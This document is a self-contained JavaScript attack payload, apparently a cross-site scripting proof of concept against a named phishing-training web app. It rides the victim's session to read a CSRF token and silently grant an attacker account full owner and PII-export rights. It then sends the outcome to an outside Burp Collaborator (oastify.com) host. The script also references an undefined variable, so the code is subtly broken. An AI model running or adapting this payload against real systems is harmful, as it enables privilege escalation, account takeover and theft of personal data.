(async () => {
  try {
    const attackerId = '9f07a688-1d50-4c56-a293-f525bd6a589e';
    const editUrl = `https://app.phished.io/en/users/administrators/${attackerId}/edit`;
    
    // 1. Get CSRF token
    const getRes = await fetch(editUrl, {
      credentials: "include"
    });
    const html = await getRes.text();
    const csrfToken = html.match(/<meta name="csrf-token" content="([^"]+)">/)[1];
    
    // 2. Prepare malicious POST data with ALL permissions
    const formData = new URLSearchParams();
    formData.append('_token', csrfToken);
    formData.append('Administrator_FirstName', '<h1>attacker</h1>');
    formData.append('Administrator_LastName', '<h1>attacker</h1>');
    formData.append('AccessRights_IsOwner', 'on');  // Full owner rights
    formData.append('AccessRights_CanManageRecipients', 'on');
    formData.append('AccessRights_CanManageDepartments', 'on');
    formData.append('AccessRights_CanManageLocations', 'on');
    formData.append('AccessRights_CanManageSimulations', 'on');
    formData.append('AccessRights_CanManageAcademy', 'on');
    formData.append('AccessRights_CanManageActivation', 'on');
    formData.append('AccessRights_CanViewReports', 'on');
    formData.append('AccessRights_CanViewReportsWithPII', 'on');  // Sensitive PII access
    formData.append('AccessRights_CanExportReports', 'on');
    formData.append('Create_User_Button', '');

    // 3. Execute privilege escalation
    const postRes = await fetch(editUrl, {
      method: 'POST',
      credentials: "include",
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': editUrl
      },
      body: formData.toString()
    });

    // 4. Verify and exfiltrate results
    const result = {
      status: postRes.status,
      statusText: postRes.statusText,
      csrfToken: csrfToken,
      targetAdmin: adminId,
      isOwner: true,
      permissionsGranted: [
        'IsOwner',
        'CanManageRecipients',
        'CanManageDepartments',
        'CanManageLocations',
        'CanManageSimulations',
        'CanManageAcademy',
        'CanManageActivation',
        'CanViewReports',
        'CanViewReportsWithPII',
        'CanExportReports'
      ]
    };
    
    await fetch("https://ta7mfh9hq3zkzpzy9evgp01luc03otci.oastify.com/?result=" + 
      encodeURIComponent(JSON.stringify(result, null, 2)));

  } catch (e) {
  }
})();
